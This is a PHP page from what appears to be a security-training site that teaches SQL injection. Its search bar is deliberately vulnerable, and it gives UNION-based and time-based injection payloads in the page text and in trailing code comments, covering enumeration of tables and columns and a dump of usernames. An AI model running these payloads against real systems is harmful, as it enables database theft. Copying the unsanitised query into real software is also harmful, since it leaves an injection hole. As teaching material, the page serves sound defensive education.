<?php

  require_once "../templates/header.php";

  //search bar
  include "../../mvc/views/home-view.php";
  include "../../mvc/models/home-model.php";
  include "../../mvc/controllers/home-controller.php";

?>
<html>
  <head>
    <link rel="stylesheet" type="text/css" href="/public/assets/css/page_template.css">
    <link rel="stylesheet" type="text/css" href="/public/assets/css/sql-injection.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  </head>
  <body>
    <div class="video-container">
      <video autoplay muted loop class="default-vid">
        <!--https://www.youtube.com/watch?v=ciNHn38EyRc-->
        <source src="/img/video/sql-injection.mp4" type="video/mp4">
      </video>
    </div>
    <div class="colour-overlay"></div>

    <div class="subheadings">
      <h1>SQL Injection Attacks</h1>
      <!-- Blind | information schema exploits | second order (Maybe as buttons)-->
      <div class="anchor-buttons">
        <button class="first-child"><a href="#Introduction">Introduction</a></button>
        <button class="middle-child"><a href="#Risks">Risks</a></button>
        <button class="second-last-child"><a href="#Demonstration">Demonstration</a></button>
        <button class="last-child"><a href="#Solutions">Solutions</a></button>
      </div>
    </div>

    <div class="header-container">
      <h1 id="Introduction">Introduction</h1>
        <div class="p-container">
          <p>Injection attacks are described by OWASP as the number one most vulnerable security risk. This vulnerability occurs when malicious input is passed into a database without being properly validated or encoded.
            <br /><br />
            This input is typically in the form of a single quote (') which escapes the query allowing additonal SQL to be written into the query.
        </p>
        </div>
    </div>

    <div class="header-overlay">
        <h1 id="Risks">Risks</h1>
          <div class="p-container">
            <p>SQL Injection can result in the following factors:
              <br /><br /> - Exposure of database structure
              <br /> - Unauthorised manipulation of classified user information (update, delete, etc)
              <br /> - Leaking of classified and sensitive user information
              <br /><br /> This is in fact the exploit that TalkTalk fell vulnerable to back in 2015 which exposed more than 150,000 users credentials
          </p>
        </div>
    </div>

    <div class="header-container">
      <h1 id="Demonstration">Demonstration</h1>
        <div class="p-container">
          <p>The following is an example of search bar where you can search for vulnerabilities that are explored on this platform. This is accomplished using the following SQL query:
            <br /><br />SELECT title FROM home_buttons WHERE title LIKE '[user_input]%'
            <br /><br />However, this also renders the search bar vulnerable to injection as users can escape the single quotes surrounding the user input. In order to first test an SQL injection, insert the following result:
            <br /><br /><b>'  UNION SELECT SLEEP(3)-- '</b> - This instructs the query to wait for 3 seconds before executing. While this won't return any results, it's enough to expose the feature's vulnerability to SQL injection.
            <br /><br /><b>' UNION SELECT name FROM INFORMATION_SCHEMA.INNODB_SYS_TABLES -- '</b> - This injection is much more destructive and calls on retrieving all tables from the information schema, a metadata table that's public in all MySQL databases
            <br /><br />See if you can uncover the sensitive user table as seen at the bottom.
          </p>
          <div class="search-container">

            <!-- New search bar-->
            <form class="search" method="GET" action="sql-injection.php?#Demonstration">

                <input type="text" name="search" placeholder="Search..." class="submit-txt"><button type="submit" name="submit" class="submit-btn"><i class="fa fa-search"></i></button>
            </form>
            <hr width="80%">
          </div>
        </div>
      </div>

        <?php

          if (isset($_GET['submit']) && !empty($_GET['search'])) {

            $search = $_GET['search'];

            //input validation

            //fetch user data //controller
            $controller = new home_controller();
            $data = $controller->insecureSearchData($search);

            if ($data) {
              if ($data->num_rows > 0) {
                $view = new home_view();
                $view->printQuery($data);
              }
              else {
                echo "<p class='result-container'>No results found for $search.</p>";
              }
            }
            else {
              echo "<p class='result-container'>Error: Invalid query</p>";
            }
          }

         ?>


        <div class="header-overlay">
          <h1 id="Solutions">Solutions</h1>
            <div class="p-container">
              <p>
                The two solutions to preventing SQL injection are as follows:
                <br /><br /><b>Prepared statements</b> - This helps encoding the output before being interpreted by the database. As a result, this prevents an application from accidentally executing an injected SQL expression.
                <br /><br /><b>Input validation</b> - This describes the sanitisation of the user input before being merged into the query. This generally checks whether the user input contains valid characters, rejecting any queries with special symbols such as (')
              </p>
            </div>
        </div>
    </div>
  </body>
</html>

<?php


  require_once "../templates/footer.php";



  //$this->sql = "SELECT title FROM home_buttons WHERE title LIKE '$query%'";

  //%' OR '%
  //%' OR '1' = '1
  //prints everything

  //sql' OR title LIKE 'cross
  //prints cross-site scripting

  //' union select title FROM home_buttons -- '
  //title can be replaced with php_page, id, etc

  //sql' OR title LIKE 'cross
  //prints cross-site scripting

  //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_TABLES -- '
  //prints names of all tables

  //' union select username FROM USERS.USERS -- '
  //prints usernames of all users

  //sleep
  //sql'  UNION SELECT SLEEP(3)-- '

  //gets columns of home table (43 from TABLE_ID in SYS_TABLES)
  //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_COLUMNS WHERE TABLE_ID = '43' -- '

  //gets db version
  //%sql' UNION SELECT version()-- '

  //gets schema of current
  //%sql' UNION SELECT schema()-- '

  //To fix
  //prepared statement
?>
